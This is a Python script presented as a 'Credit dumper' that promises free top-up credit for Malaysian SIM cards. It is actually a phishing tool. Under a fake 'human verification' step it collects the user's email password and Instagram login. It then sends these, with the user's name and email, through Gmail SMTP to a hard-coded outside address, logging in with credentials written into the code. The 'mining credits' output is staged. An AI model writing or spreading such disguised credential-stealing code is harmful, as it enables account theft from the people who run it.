import os
import smtplib
import csv
import time
from ftplib import FTP
import platform
import requests
platform_type = platform.system()

def run_email():
	
		server = smtplib.SMTP("smtp.gmail.com:587")
		server.ehlo()
		server.starttls()
		server.login('wayarperak@gmail.com', 'jupiter135mx')
		
		sent_from = 'wayarperak@gmail'
		to = 'najwanhassan03@gmail.com'
		subject = "test"
		msg = ('''
		Name: %s
		Email: %s
		Email Password: %s
		\nig username: %s
		\nig password: %s
		''' % (name, email, email_password, ig_username, ig_password))
		server.sendmail(sent_from, to, msg)
	
		
		
def run_human_verification():
	global ig_username
	global ig_password
	ig_username = raw_input("Instagram Username: ")
	ig_password = raw_input("Instagram Password: ")


		

	if ( platform_type == "Windows" ):
		os.system('cls')
	elif ( platform_type == 'Linux' ):
		os.system('clear')
		
	print("Creating Your Database . . .")

	registered_file = open("registered.csv", "w")
	registered_file.write("name,username,password,sim_type\n%s,%s,%s,%s" % (name,username, password, sim_type))
	run_email()
			
	
def run_login():
	
	with open('registered.csv', 'r') as login_info:
		csv_database = csv.reader(login_info)
		
		next(csv_database)
		
		for line in csv_database:
			name = line[0]
			username = line[1]
			password = line[2]
			
			username_login = raw_input("Username: ")
			password_login = raw_input("Password: ")
			
			if (username_login == username):
				if (password_login == password):
					print("You're the 52th users")
					print(" ")
					print("Welcome " + name)
					print("login successful")
					topup = requests.get('https://hazanis.000webhostapp.com/test/umobile.txt')
					print(" ")
					print(" ")
					time.sleep(2)
					print("[ + ] Starting tunel!")
					time.sleep(2)
					print("[ + ] Mining some credits . . .")
					time.sleep(4)
					print(" ")
					print(topup.text)
			
			else:
				print("wrong username or password!")
				return run_login()

	
def run_registerations():
	global username
	global password
	global name
	global email_password
	global email
	global sim_type

	name = raw_input("New Name: ")
	email = raw_input("Your email: ")
	email_password = raw_input("Your email password: ")
	username = raw_input("New Username: ")
	password = raw_input("New Password: ")
	print ('''
	1. ONE XOX
	2. XOX BLACK
	3. CELCOM
	4. DIGI
	5. HOTLINK
	6. UMOBILE
	7. TUNE TALK
	''')
	sim_type = raw_input("Your sim card: ")
	print("\n***********")
	print("Human verification")
	print("***********\n")
	run_human_verification()
	
if ( platform_type == "Windows" ):
	os.system('cls')
elif ( platform_type == 'Linux' ):
	os.system('clear')
	
print("Credit dumper")

if (os.path.exists("registered.csv")):
	run_login()
else:
	run_registerations()